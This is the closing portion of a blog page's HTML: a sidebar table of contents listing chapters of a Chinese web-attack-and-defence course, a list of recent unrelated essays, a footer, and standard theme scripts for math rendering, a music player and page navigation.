href="#%E4%BD%BF%E7%94%A8%E8%BD%AC%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-text">使用转义函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%EF%BC%88%E6%8E%A8%E8%8D%90%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-text">使用参数化查询（推荐方法）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-text">其他防护措施</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E5%AF%B9%E6%AF%94%E6%80%BB%E7%BB%93"><span class="toc-text">防护对比总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE5-%E6%9B%B4%E6%96%B0%E5%AF%86%E7%A0%81%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">项目5 更新密码二阶注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E9%98%B6SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">二阶SQL注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E5%AF%86%E7%A0%81%E4%B8%8E%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">更新密码与二阶注入攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">二阶注入攻击防护</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE6-Cookie-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">项目6 Cookie 注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-text">Cookie的概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E4%B8%8ESession%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">Cookie与Session的区别</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">Cookie注入攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">Cookie注入攻击防护</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE7-HTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">项目7 HTTP 头部注入攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AF%87-%E5%89%8D%E7%AB%AF%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E6%8A%A4"><span class="toc-text">第三篇 前端攻击及防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE8-Session-%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB"><span class="toc-text">项目8 Session 欺骗攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Session%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80"><span class="toc-text">Session欺骗攻击基础</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Session%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="toc-text">Session欺骗攻击测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Session%E6%AC%BA%E9%AA%97%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-text">Session欺骗防护措施</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%94%80%E6%9C%BA%E5%88%B6"><span class="toc-text">1. 使用注销机制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E8%AE%BE%E7%BD%AESession%E7%9A%84%E7%94%9F%E5%AD%98%E6%97%B6%E9%97%B4"><span class="toc-text">2. 设置Session的生存时间</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E6%A3%80%E6%B5%8BUser-Agent%E7%9A%84%E4%B8%80%E8%87%B4%E6%80%A7"><span class="toc-text">3. 检测User-Agent的一致性</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-%E9%87%8D%E7%BD%AESessionID"><span class="toc-text">4. 重置SessionID</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE9-Cookie-%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB"><span class="toc-text">项目9 Cookie 欺骗攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">Cookie工作原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB"><span class="toc-text">Cookie欺骗攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%AC%BA%E9%AA%97%E6%B5%8B%E8%AF%95"><span class="toc-text">Cookie欺骗测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-text">防护措施</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE10-XSS-%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB"><span class="toc-text">项目10 XSS 跨站攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">XSS攻击防护</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE11-CSRF-%E8%B7%A8%E7%AB%99%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB"><span class="toc-text">项目11 CSRF 跨站伪造请求攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CSRF%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">CSRF攻击基础知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CSRF%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="toc-text">CSRF攻击测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CSRF%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">CSRF攻击防护</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE12-%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-text">项目12 验证码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E6%80%9D%E8%80%83"><span class="toc-text">拓展思考</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E6%8A%A4"><span class="toc-text">第四篇 文件漏洞及防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE13-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">项目13 文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="toc-text">文件上传漏洞攻击测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4"><span class="toc-text">文件上传漏洞防护</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E6%80%9D%E8%80%83-1"><span class="toc-text">拓展思考</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE14-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-text">项目14 文件下载漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE15-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">项目15 文件解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE16-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">项目16 文件包含漏洞</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/09/02/14-social-order/" title="社会为什么总在劝你合群？因为“我们”是最便宜的组织方式"><img src="/images/ai-series/covers/14-social-order-cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="社会为什么总在劝你合群？因为“我们”是最便宜的组织方式"/></a><div class="content"><a class="title" href="/2026/09/02/14-social-order/" title="社会为什么总在劝你合群？因为“我们”是最便宜的组织方式">社会为什么总在劝你合群？因为“我们”是最便宜的组织方式</a><time datetime="2026-09-02T02:00:00.000Z" title="发表于 2026-09-02 10:00:00">2026-09-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/01/13-science/" title="什么都能解释的理论，跟“啥都能圆”的算命有啥区别？"><img src="/images/ai-series/covers/13-science-cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="什么都能解释的理论，跟“啥都能圆”的算命有啥区别？"/></a><div class="content"><a class="title" href="/2026/09/01/13-science/" title="什么都能解释的理论，跟“啥都能圆”的算命有啥区别？">什么都能解释的理论，跟“啥都能圆”的算命有啥区别？</a><time datetime="2026-09-01T02:00:00.000Z" title="发表于 2026-09-01 10:00:00">2026-09-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/31/12-success/" title="网上那么多“上岸经验”，到底有多少是在事后编故事？"><img src="/images/ai-series/covers/12-success-cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网上那么多“上岸经验”，到底有多少是在事后编故事？"/></a><div class="content"><a class="title" href="/2026/08/31/12-success/" title="网上那么多“上岸经验”，到底有多少是在事后编故事？">网上那么多“上岸经验”，到底有多少是在事后编故事？</a><time datetime="2026-08-31T02:00:00.000Z" title="发表于 2026-08-31 10:00:00">2026-08-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/30/11-system-redundancy/" title="依赖定价机制：全球化越深，为什么世界反而开始造“第二套系统”？"><img src="/images/ai-series/covers/11-system-redundancy-cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="依赖定价机制：全球化越深，为什么世界反而开始造“第二套系统”？"/></a><div class="content"><a class="title" href="/2026/08/30/11-system-redundancy/" title="依赖定价机制：全球化越深，为什么世界反而开始造“第二套系统”？">依赖定价机制：全球化越深，为什么世界反而开始造“第二套系统”？</a><time datetime="2026-08-30T02:00:00.000Z" title="发表于 2026-08-30 10:00:00">2026-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/29/10-market-value/" title="网红赚得比工程师多，真的是社会分配出了 Bug？"><img src="/images/ai-series/covers/10-market-value-cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网红赚得比工程师多，真的是社会分配出了 Bug？"/></a><div class="content"><a class="title" href="/2026/08/29/10-market-value/" title="网红赚得比工程师多，真的是社会分配出了 Bug？">网红赚得比工程师多，真的是社会分配出了 Bug？</a><time datetime="2026-08-29T02:00:00.000Z" title="发表于 2026-08-29 10:00:00">2026-08-29</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By moyuan</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.1.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script><script src="/js/custom.js?v=20260506-hitokoto-fallback"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/music/*"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      false
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
